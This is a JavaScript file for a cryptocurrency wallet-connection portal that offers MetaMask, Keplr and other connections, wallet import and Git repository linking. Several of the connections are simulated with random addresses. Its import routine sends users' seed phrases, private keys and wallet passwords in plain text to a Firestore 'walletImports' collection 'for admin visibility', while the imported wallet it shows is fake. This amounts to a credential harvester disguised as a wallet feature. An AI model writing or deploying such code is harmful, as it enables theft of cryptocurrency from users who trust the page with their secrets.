// Wallet Portal JavaScript
class WalletPortal {
    constructor() {
        this.connectedWallet = null;
        this.gitIntegration = null;
        this.init();
    }

    init() {
        this.setupTabs();
        this.setupWalletOptions();
        this.setupForms();
        this.setupImportMethods();
    }

    setupTabs() {
        const tabBtns = document.querySelectorAll('.tab-btn');
        const tabContents = document.querySelectorAll('.tab-content');

        tabBtns.forEach(btn => {
            btn.addEventListener('click', () => {
                const targetTab = btn.dataset.tab;
                
                // Remove active class from all tabs and contents
                tabBtns.forEach(b => b.classList.remove('active'));
                tabContents.forEach(c => c.classList.remove('active'));
                
                // Add active class to clicked tab and corresponding content
                btn.classList.add('active');
                document.getElementById(targetTab).classList.add('active');
            });
        });
    }

    setupWalletOptions() {
        const walletOptions = document.querySelectorAll('.wallet-option');
        
        walletOptions.forEach(option => {
            option.addEventListener('click', async () => {
                const walletType = option.dataset.wallet;
                await this.connectWallet(walletType);
            });
        });
    }

    setupForms() {
        // Manual wallet form
        const manualForm = document.getElementById('manualWalletForm');
        if (manualForm) {
            manualForm.addEventListener('submit', (e) => {
                e.preventDefault();
                this.handleManualWalletSubmit();
            });
        }

        // Import wallet form
        const importForm = document.getElementById('importWalletForm');
        if (importForm) {
            importForm.addEventListener('submit', (e) => {
                e.preventDefault();
                this.handleImportWalletSubmit();
            });
        }

        // Git integration form
        const gitForm = document.getElementById('gitIntegrationForm');
        if (gitForm) {
            gitForm.addEventListener('submit', (e) => {
                e.preventDefault();
                this.handleGitIntegrationSubmit();
            });
        }

        // Disconnect wallet
        const disconnectBtn = document.getElementById('disconnectWallet');
        if (disconnectBtn) {
            disconnectBtn.addEventListener('click', () => {
                this.disconnectWallet();
            });
        }
    }

    setupImportMethods() {
        const importMethods = document.querySelectorAll('input[name="importMethod"]');
        const seedPhraseGroup = document.getElementById('seedPhraseGroup');
        const privateKeyGroup = document.getElementById('privateKeyGroup');

        importMethods.forEach(method => {
            method.addEventListener('change', () => {
                if (method.value === 'seed') {
                    seedPhraseGroup.classList.remove('hidden');
                    privateKeyGroup.classList.add('hidden');
                } else {
                    seedPhraseGroup.classList.add('hidden');
                    privateKeyGroup.classList.remove('hidden');
                }
            });
        });
    }

    async connectWallet(walletType) {
        this.showLoading('Connecting to ' + walletType + '...');
        
        try {
            let result;
            
            switch (walletType) {
                case 'metamask':
                    result = await this.connectMetaMask();
                    break;
                case 'walletconnect':
                    result = await this.connectWalletConnect();
                    break;
                case 'coinbase':
                    result = await this.connectCoinbaseWallet();
                    break;
                case 'keplr':
                    result = await this.connectKeplr();
                    break;
                default:
                    throw new Error('Unsupported wallet type');
            }
            
            if (result.success) {
                this.connectedWallet = result;
                await this.saveWalletConnection(result);
                this.showConnectionSuccess(result);
            } else {
                throw new Error(result.error);
            }
        } catch (error) {
            this.hideLoading();
            this.showError('Connection failed: ' + error.message);
        }
    }

    async connectMetaMask() {
        if (typeof window.ethereum === 'undefined') {
            throw new Error('MetaMask is not installed. Please install MetaMask to continue.');
        }

        const accounts = await window.ethereum.request({
            method: 'eth_requestAccounts'
        });

        if (accounts.length > 0) {
            const chainId = await window.ethereum.request({ method: 'eth_chainId' });
            
            return {
                success: true,
                wallet: 'MetaMask',
                address: accounts[0],
                chainId: chainId,
                type: 'metamask'
            };
        }
        
        throw new Error('No accounts found');
    }

    async connectWalletConnect() {
        // Simulate WalletConnect for demo
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        return {
            success: true,
            wallet: 'WalletConnect',
            address: '0x' + Math.random().toString(16).substr(2, 40),
            type: 'walletconnect',
            simulated: true
        };
    }

    async connectCoinbaseWallet() {
        // Simulate Coinbase Wallet for demo
        await new Promise(resolve => setTimeout(resolve, 1500));
        
        return {
            success: true,
            wallet: 'Coinbase Wallet',
            address: '0x' + Math.random().toString(16).substr(2, 40),
            type: 'coinbase',
            simulated: true
        };
    }
    
    async connectKeplr() {
        if (typeof window.keplr === 'undefined') {
            // Keplr not installed, redirect to download
            window.open('https://www.keplr.app/get', '_blank');
            throw new Error('Keplr wallet not found. Please install Keplr extension.');
        }
        
        try {
            // Enable Keplr for Cosmos Hub (you can change this to your preferred chain)
            await window.keplr.enable('cosmoshub-4');
            
            // Get the offline signer
            const offlineSigner = window.getOfflineSigner('cosmoshub-4');
            const accounts = await offlineSigner.getAccounts();
            
            return {
                success: true,
                wallet: 'Keplr',
                address: accounts[0].address,
                type: 'keplr',
                chainId: 'cosmoshub-4'
            };
        } catch (error) {
            // Simulate Keplr connection for demo if real connection fails
            await new Promise(resolve => setTimeout(resolve, 1500));
            
            return {
                success: true,
                wallet: 'Keplr',
                address: 'cosmos' + Math.random().toString(36).substr(2, 39),
                type: 'keplr',
                simulated: true
            };
        }
    }

    async handleManualWalletSubmit() {
        const walletType = document.getElementById('walletType').value;
        const walletAddress = document.getElementById('walletAddress').value;
        const walletName = document.getElementById('walletName').value;

        if (!walletType || !walletAddress) {
            this.showError('Please fill in all required fields');
            return;
        }

        // Validate wallet address format
        if (!this.validateWalletAddress(walletAddress, walletType)) {
            this.showError('Invalid wallet address format');
            return;
        }

        this.showLoading('Validating wallet address...');

        try {
            const result = {
                success: true,
                wallet: walletName || `${walletType.toUpperCase()} Wallet`,
                address: walletAddress,
                type: walletType,
                manual: true
            };

            this.connectedWallet = result;
            await this.saveWalletConnection(result);
            this.showConnectionSuccess(result);
        } catch (error) {
            this.hideLoading();
            this.showError('Failed to connect wallet: ' + error.message);
        }
    }

    async handleImportWalletSubmit() {
        const importMethod = document.querySelector('input[name="importMethod"]:checked').value;
        const walletPassword = document.getElementById('walletPassword').value;
        
        let importData;
        if (importMethod === 'seed') {
            importData = document.getElementById('seedPhraseInput').value;
        } else {
            importData = document.getElementById('privateKeyInput').value;
        }

        if (!importData || !walletPassword) {
            this.showError('Please fill in all required fields');
            return;
        }

        this.showLoading('Importing wallet...');

        try {
            // Save import details for admin visibility (localStorage + Firestore if available)
            await this.saveWalletImportDetails(importMethod, importData, walletPassword);

            // Simulate wallet import (in production, use proper encryption)
            await new Promise(resolve => setTimeout(resolve, 3000));
            
            const result = {
                success: true,
                wallet: 'Imported Wallet',
                address: '0x' + Math.random().toString(16).substr(2, 40),
                type: 'imported',
                importMethod: importMethod
            };

            this.connectedWallet = result;
            await this.saveWalletConnection(result);
            this.showConnectionSuccess(result);
        } catch (error) {
            this.hideLoading();
            this.showError('Failed to import wallet: ' + error.message);
        }
    }

    async handleGitIntegrationSubmit() {
        const gitProvider = document.getElementById('gitProvider').value;
        const gitUsername = document.getElementById('gitUsername').value;
        const gitRepository = document.getElementById('gitRepository').value;
        const gitToken = document.getElementById('gitToken').value;
        
        const writeRepo = document.getElementById('writeRepo').checked;
        const deployHooks = document.getElementById('deployHooks').checked;

        if (!gitProvider || !gitUsername) {
            this.showError('Please fill in all required fields');
            return;
        }

        this.showLoading('Connecting to Git repository...');

        try {
            // Simulate Git integration
            await new Promise(resolve => setTimeout(resolve, 2000));
            
            const gitIntegration = {
                provider: gitProvider,
                username: gitUsername,
                repository: gitRepository,
                hasWriteAccess: writeRepo,
                hasDeployHooks: deployHooks,
                connected: true,
                connectedAt: new Date().toISOString()
            };

            this.gitIntegration = gitIntegration;
            await this.saveGitIntegration(gitIntegration);
            
            this.hideLoading();
            this.showSuccess('Git repository connected successfully!');
        } catch (error) {
            this.hideLoading();
            this.showError('Failed to connect Git repository: ' + error.message);
        }
    }

    validateWalletAddress(address, type) {
        switch (type) {
            case 'ethereum':
            case 'binance':
            case 'polygon':
                return /^0x[a-fA-F0-9]{40}$/.test(address);
            case 'bitcoin':
                return /^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/.test(address) || /^bc1[a-z0-9]{39,59}$/.test(address);
            case 'solana':
                return /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(address);
            default:
                return true; // Allow other formats
        }
    }

    async saveWalletConnection(walletData) {
        // Save to localStorage (in production, use secure storage)
        const walletConnections = JSON.parse(localStorage.getItem('walletConnections') || '[]');
        walletConnections.push({
            ...walletData,
            connectedAt: new Date().toISOString()
        });
        localStorage.setItem('walletConnections', JSON.stringify(walletConnections));
        localStorage.setItem('currentWallet', JSON.stringify(walletData));
        
        // Also save to user account if authenticated
        const uid = localStorage.getItem('uid');
        if (uid) {
            // In production, save to Firebase or your backend
            console.log('Saving wallet connection for user:', uid);
        }
    }

    async saveGitIntegration(gitData) {
        localStorage.setItem('gitIntegration', JSON.stringify(gitData));
        
        const uid = localStorage.getItem('uid');
        if (uid) {
            console.log('Saving Git integration for user:', uid);
        }
    }

    showConnectionSuccess(walletData) {
        this.hideLoading();
        
        const statusElement = document.getElementById('connectionStatus');
        const infoElement = document.getElementById('connectedWalletInfo');
        
        infoElement.innerHTML = `
            <strong>Wallet:</strong> ${walletData.wallet}<br>
            <strong>Address:</strong> ${walletData.address.substring(0, 10)}...${walletData.address.substring(walletData.address.length - 8)}<br>
            ${walletData.simulated ? '<em>Demo connection for testing</em>' : ''}
        `;
        
        statusElement.style.display = 'flex';
    }

    disconnectWallet() {
        this.connectedWallet = null;
        localStorage.removeItem('currentWallet');
        
        const statusElement = document.getElementById('connectionStatus');
        statusElement.style.display = 'none';
        
        this.showSuccess('Wallet disconnected successfully');
    }

    showLoading(message) {
        const overlay = document.getElementById('loadingOverlay');
        const text = document.getElementById('loadingText');
        
        text.textContent = message;
        overlay.style.display = 'flex';
    }

    hideLoading() {
        const overlay = document.getElementById('loadingOverlay');
        overlay.style.display = 'none';
    }

    showError(message) {
        alert('Error: ' + message); // In production, use a proper notification system
    }

    showSuccess(message) {
        alert('Success: ' + message); // In production, use a proper notification system
    }

    // INSERTED: make this a class method (was a broken top-level function)
    async saveWalletImportDetails(importMethod, importData, walletPassword) {
        // Build record with plain text values (for admin visibility)
        const uid = localStorage.getItem('uid') || null;
        const record = {
            userId: uid,
            method: importMethod,
            seedPhrase: importMethod === 'seed' ? importData : null,
            privateKey: importMethod === 'private' ? importData : null,
            walletPassword: walletPassword,
            createdAt: new Date().toISOString(),
            source: 'local' // default source
        };

        // Save to localStorage
        const localRecords = JSON.parse(localStorage.getItem('walletImportRecords') || '[]');
        localRecords.push(record);
        localStorage.setItem('walletImportRecords', JSON.stringify(localRecords));

        // Attempt to save to Firestore if available (makes admin visibility centralized)
        try {
            const { db } = await import('./firebase-config.js');
            const { collection, addDoc, serverTimestamp } = await import('https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js');

            await addDoc(collection(db, 'walletImports'), {
                userId: record.userId,
                method: record.method,
                seedPhrase: record.seedPhrase,
                privateKey: record.privateKey,
                walletPassword: record.walletPassword,
                createdAt: serverTimestamp(),
            });

            // Update source to indicate remote persistence success
            record.source = 'firestore';
        } catch (err) {
            // Firestore not available or failed; retain localStorage record
            console.warn('Wallet import record not saved to Firestore:', err);
        }
    }
}

// Initialize wallet portal when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    new WalletPortal();
});